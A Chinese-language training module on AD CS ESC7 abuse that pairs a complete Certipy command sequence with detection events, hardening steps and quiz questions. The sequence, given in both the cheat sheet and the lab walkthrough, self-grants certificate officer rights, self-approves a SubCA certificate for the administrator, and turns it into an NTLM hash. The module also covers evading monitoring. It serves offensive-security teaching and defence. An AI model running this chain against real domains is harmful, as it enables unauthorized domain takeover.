# R17.6 憑證簽發審批與處置管理權限濫用分析 (Certificate Authority Rights Abuse / ESC7)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**憑證授權單位管理權限濫用 (AD CS ESC7)** 發生於低權限使用者或委派帳號在 CA 伺服器本體上具備過高管理特權時。其本質為：**「Active Directory 憑證伺服器實例本身擁有獨立的安全描述元 (Security Descriptor)；當攻擊帳號被賦予 `ManageCA` (CA 管理員) 或 `ManageCertificates` (憑證主管/發行審批人) 存取控制項時，攻擊者可先自我授權成為發行主管，隨後提交需要手動審核或高度受限的特權憑證申請（使其進入擱置狀態），再利用自身的主管特權自行審批通過該申請，達成繞過審批機制的閉環提權」**。

```
[攻擊者帳號 (具備 ManageCA 或 ManageCertificates 權限)]
       │
       ├── 1. 若具備 ManageCA：自我賦予 ManageCertificates 特權 (certipy ca -add-officer)
       │
       ├── 2. 向 SubCA 範本發起申請 (請求進入 Pending 擱置狀態，獲得 Request ID: 42)
       │
       ├── 3. 利用自身憑證主管身分，自主批准該請求：certipy ca -issue-request 42
       ▼
[企業 CA 伺服器 (將 Request 42 狀態翻轉為 Approved!)]
       │
       ├── 4. 提取已批准之數位憑證：certipy req -retrieve 42
       ▼
[攻擊者控制台] ◄── 5. 取得簽發之特權 PFX 憑證 ➔ 發起 Kerberos PKINIT 取得全域控制權！
```

### 核心作戰決策與邊界
- **ESC7 核心權限對照**：
  - **`ManageCA`**：CA 頂級系統管理員。可直接修改 CA 登錄檔旗標（如開啟 ESC6）、新增憑證發行官、備份 CA 資料庫與私鑰。
  - **`ManageCertificates`**：憑證主管 (Officer)。負責審批、拒絕或吊銷處於掛起 (Pending) 狀態的憑證要求。
- **技術邊界**：
  - **與 ESC4 差異**：ESC4 針對的是「憑證範本物件」的 ACL；ESC7 針對的是「CA 伺服器服務實例本身」的 ACL。

## 🔬 第一動：CA 管理員與憑證主管權限模型全景解剖 (Mechanics & Access Rights)

### 1. CA 伺服器存取控制權限矩陣

| 存取權限名稱 (Access Right) | 權限常數 (Hex) | 關鍵作戰能力 |
| :--- | :--- | :--- |
| **`ManageCA`** | `0x00000001` (`CR_RIGHT_ADMIN`) | 可配置 CA 屬性、修改 EditFlags 登錄檔、隨意委派授權。 |
| **`ManageCertificates`** | `0x00000002` (`CR_RIGHT_OFFICER`) | **核心武器**：可調用 `ResubmitRequest` 審批通過任意掛起憑證。 |
| **`IssueAndManageCertificates`**| 同上 | 具備對受限憑證直接簽發權力。 |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心利用指令速查表 (Certipy)

#### 1. 探測 CA 管理權限弱點 (ESC7)
```bash
certipy find -u "operator@corp.internal" -p "P@ssword123" -dc-ip 10.0.0.1 -vulnerable
# 檢查輸出中 CA 區塊是否標記:
# [!] Vulnerabilities
#     ESC7: User has ManageCA / ManageCertificates rights
```

#### 2. 若具備 ManageCA：賦予自身 ManageCertificates 權限
```bash
certipy ca -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -add-officer "operator" -dc-ip 10.0.0.1
# 輸出: Successfully added officer 'operator'
```

#### 3. 提交需要審批的高特權憑證申請 (進入 Pending)
```bash
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -template "SubCA" -upn "administrator@corp.internal" -dc-ip 10.0.0.1
# 輸出: Request ID is 88. The request is in state 'Pending'
```

#### 4. 以主管身分自行審批並提取憑證
```bash
# 自主審批通過該 Request ID
certipy ca -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -issue-request 88 -dc-ip 10.0.0.1

# 自行提取簽發後的證書
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -retrieve 88 -dc-ip 10.0.0.1
# 輸出: administrator.pfx
```

#### 5. PKINIT 換取 TGT
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **合法工作流偽裝**：
  - 攻擊者不修改任何範本，完全走合規的「提交 ➔ 審查 ➔ 簽發 ➔ 領取」正常流程；對於一般只監控「異常範本改動」的 SOC 系統具備天然免疫力。
- **鑑識與遙測特徵**：
  - **CA 安全權限修改 (Event ID 4882)**：記錄到 CA 存取控制清單被修改（如新增了非預期的 Officer）。
  - **憑證處置操作審計 (Event ID 4888)**：記錄到某個 Request ID 被特定使用者執行了 `Approved/Issued` 動作，比對該審批人帳號**竟與發起申請的帳號完全相同**（自我審批）。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **自我指派 Officer 權限** | Event 4882 記錄 CA 安全性變更 | 嚴格收斂 CA 的 `ManageCA` 權限至本機 Admins | 尋找透過服務組態繼承的次要管理群組 |
| **自審自簽特權憑證** | Event 4888 顯示審批者與申請者相同 | 實施雙人審批分權原則；審批告警通知 | 建立第二受控帳號分飾申請者與審批者 |
| **PKINIT 登入** | Event 4768 記錄 PreAuth 16 登入 | 限制網域核心特權帳號無法使用憑證登入 | 轉向透過 LDAPS 導出敏感數據 |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. 稽核並收斂 CA 伺服器安全性 (Security Tab)
在憑證授權單位 MMC 管理主控台：
1. 右鍵點擊 CA 伺服器 ➔ **內容 (Properties)** ➔ **Security (安全性)** 分頁；
2. 逐一檢查群組清單：
   - 確保除了 `Enterprise Admins` 與本機 `Administrators` 外，**徹底移除任何一般使用者或服務帳號的 `Manage CA` 權限**；
   - 確保 `Issue and Manage Certificates` 僅授予受嚴格監管的少數特定安全維運人員。

### 2. 拔除不當委派之主管角色 (certutil 命令)
```cmd
:: 檢查當前 CA 的安全權限設定
certutil -getreg ca\Security
```

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場情境設定
- **網域**：`corp.internal`
- **攻擊者**：`svc_ca_admin` (被錯誤授予了 CA 上的 `ManageCA` 特權，但並非 Domain Admin)

### 2. 三步驗證流程

1. **添加自身為憑證主管**：
   ```bash
   certipy ca -u "svc_ca_admin@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
       -add-officer "svc_ca_admin" -dc-ip 10.0.0.1
   # 回顯: Successfully added officer 'svc_ca_admin'
   ```
2. **申請管理員憑證並自行批准**：
   ```bash
   # 提交申請
   certipy req -u "svc_ca_admin@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
       -template "SubCA" -upn "Administrator@corp.internal" -dc-ip 10.0.0.1
   # 獲得 Request ID: 101 (Pending)

   # 自行審核通過並提取
   certipy ca -u "svc_ca_admin@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
       -issue-request 101 -dc-ip 10.0.0.1
   certipy req -u "svc_ca_admin@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
       -retrieve 101 -dc-ip 10.0.0.1
   # 成功獲得 Administrator.pfx
   ```
3. **換取 Administrator 雜湊值**：
   ```bash
   certipy auth -pfx Administrator.pfx -dc-ip 10.0.0.1
   # 成功導出 Administrator NTLM Hash，驗證提權成立！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. AD CS 中的 ESC7 漏洞核心成因是什麼？**  
  *分析思路*：非 Domain/Enterprise Admins 的普通帳號被錯誤授予了 CA 實例的安全權限（`ManageCA` 或 `ManageCertificates`），使攻擊者能自我授權並自主審核簽發原本需要高權限把關的敏感憑證。

- [ ] **Q2. `ManageCA` 與 `ManageCertificates` 兩項權限在利用鏈中的關係為何？**  
  *分析思路*：`ManageCA` 具有最高控制權，可直接將帳號寫入 CA 的 Officer 清單中賦予 `ManageCertificates`；而 `ManageCertificates` 則是執行實質「審批通過處於擱置狀態的憑證請求」的關鍵動作權限。

- [ ] **Q3. 攻擊者在利用 ESC7 時，為什麼通常選擇 `SubCA` 範本發起申請？**  
  *分析思路*：預設的 `SubCA` 範本具備任意用途，但在發行需求中預設要求管理員審批；常規用戶申請會卡在 Pending 狀態，而擁有 `ManageCertificates` 的攻擊者剛好可以自行將其審批通過，獲取頂級 SubCA 憑證。

- [ ] **Q4. 藍隊要如何防範「自我申請、自我審批」的特權濫用？**  
  *分析思路*：在 SIEM 中建立關聯告警：將 Event ID 4886（憑證申請）與 Event ID 4888（憑證核准）關聯，若兩個事件中調用者帳號完全相同，立即觸發高優先級安全通報。

- [ ] **Q5. 徹底修復 ESC7 的加固要求為何？**  
  *分析思路*：在 CA 伺服器安全性設定中全面稽核 DACL，嚴禁任何非管理員群組擁有 `ManageCA` 或 `ManageCertificates` 特權。
